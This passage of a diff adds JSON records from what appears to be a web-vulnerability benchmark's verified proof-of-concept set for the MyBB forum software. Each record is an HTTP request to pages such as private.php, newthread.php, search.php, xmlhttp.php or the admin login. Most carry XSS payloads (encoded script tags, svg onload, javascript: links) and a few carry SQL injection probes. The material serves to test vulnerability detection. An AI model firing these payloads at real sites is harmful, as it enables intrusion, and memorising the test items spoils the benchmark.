+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_c45097",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "\""
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_c845d9",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_e4856c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_e51edb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/search.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "do_search"
+      ],
+      "author": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "debug": [
+        "1"
+      ],
+      "findthreadst": [
+        "2"
+      ],
+      "forums[]": [
+        "2"
+      ],
+      "keywords": [
+        "1998-10-11"
+      ],
+      "matchusername": [
+        "1"
+      ],
+      "numreplies": [
+        "1998-10-11"
+      ],
+      "pddir": [
+        "1"
+      ],
+      "postdate": [
+        "90"
+      ],
+      "postthread": [
+        "1"
+      ],
+      "showresults": [
+        "posts"
+      ],
+      "sortby": [
+        "views"
+      ],
+      "sortordr": [
+        "desc"
+      ],
+      "submit": [
+        "Search"
+      ],
+      "visible": [
+        "1"
+      ]
+    },
+    "request_id": "requests.682870b6926a9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_ea2e8f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/private.php",
+    "post_data": {
+      "action": [
+        "do_send"
+      ],
+      "bcc": [
+        "Hi there!"
+      ],
+      "do": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "options[disablesmilies]": [
+        "1"
+      ],
+      "options[readreceipt]": [
+        "1"
+      ],
+      "options[savecopy]": [
+        "1"
+      ],
+      "options[signature]": [
+        "1"
+      ],
+      "pmid": [
+        "0"
+      ],
+      "preview": [
+        "Preview"
+      ],
+      "saveasdraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Send Message"
+      ],
+      "to": [
+        "Hi there!"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a129a3442d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_ecdf09",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/memberlist.php",
+    "post_data": {
+      "$('[for": [
+        "username]').on('click', function(){"
+      ]
+    },
+    "query_params": {
+      "google": [
+        "default"
+      ],
+      "icq": [
+        "default"
+      ],
+      "order": [
+        "descending"
+      ],
+      "perpage": [
+        "15"
+      ],
+      "skype": [
+        "default"
+      ],
+      "sort": [
+        "referrals"
+      ],
+      "username": [
+        "alice"
+      ],
+      "website": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.681a129f84414",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_f011be",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/newthread.php",
+    "post_data": {
+      "FILEUPLOAD": [
+        "Array"
+      ],
+      "action": [
+        "do_newthread"
+      ],
+      "attachmentact": [
+        "default"
+      ],
+      "attachmentaid": [
+        "default"
+      ],
+      "icon": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "message": [
+        "Hi there!"
+      ],
+      "modoptions": [
+        "Array"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "newattachment": [
+        "Add Attachment"
+      ],
+      "numpolloptions": [
+        "2"
+      ],
+      "posthash": [
+        "82fd1b4518db761359af4ae9cc1d9682"
+      ],
+      "postoptions": [
+        "Array"
+      ],
+      "postpoll": [
+        "1"
+      ],
+      "previewpost": [
+        "Preview Post"
+      ],
+      "quoted_ids": [
+        "default"
+      ],
+      "savedraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Post Thread"
+      ],
+      "tid": [
+        "0"
+      ]
+    },
+    "query_params": {
+      "fid": [
+        "2"
+      ],
+      "processed": [
+        "1"
+      ]
+    },
+    "request_id": "requests.681a12b7a207a",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_f22325",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/admin/index.php",
+    "post_data": {
+      "do": [
+        "login"
+      ],
+      "password": [
+        "Letm3in_"
+      ],
+      "username": [
+        "sqli@%27"
+      ]
+    },
+    "query_params": {
+      "module": [
+        "user-banning"
+      ],
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.681a129c62ae1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_f64c64",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/xmlhttp.php",
+    "post_data": {},
+    "query_params": {
+      "_": [
+        "1745953165191"
+      ],
+      "action": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "query": [
+        "1998-10-11"
+      ]
+    },
+    "request_id": "requests.681b6f8362251",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_f716ee",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "GET",
+    "path": "/xmlhttp.php",
+    "post_data": {},
+    "query_params": {
+      "_": [
+        "1744209924411"
+      ],
+      "action": [
+        "get_users"
+      ],
+      "query": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.67f7e47c93398",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_fcfbe4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "mybb",
+    "application_name": "MyBB",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-mybb-v0.1.0",
+    "method": "POST",
+    "path": "/newthread.php",
+    "post_data": {
+      "FILEUPLOAD": [
+        "Array"
+      ],
+      "action": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "attachmentact": [
+        "default"
+      ],
+      "attachmentaid": [
+        "default"
+      ],
+      "icon": [
+        "7"
+      ],
+      "message": [
+        "Hi there!"
+      ],
+      "modoptions": [
+        "Array"
+      ],
+      "my_post_key": [
+        "329ae25e2dc1fb6a02f935020d94c62e"
+      ],
+      "newattachment": [
+        "Add Attachment"
+      ],
+      "numpolloptions": [
+        "2"
+      ],
+      "posthash": [
+        "82fd1b4518db761359af4ae9cc1d9682"
+      ],
+      "postoptions": [
+        "Array"
+      ],
+      "postpoll": [
+        "1"
+      ],
+      "previewpost": [
+        "Preview Post"
+      ],
+      "quoted_ids": [
+        "default"
+      ],
+      "savedraft": [
+        "Save as Draft"
+      ],
+      "subject": [
+        "default"
+      ],
+      "submit": [
+        "Post Thread"
+      ],
+      "tid": [
+        "0"
+      ]
+    },
+    "query_params": {
+      "fid": [
+        "2"
+      ],
+      "processed": [
+        "1"
+      ]
+    },
+    "request_id": "requests.681a12b7a6236",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/mybb/mybb",
+    "vuln_id": "vuln_function_ff41c2",
+    "vuln_type": "xss"
+  }
+]
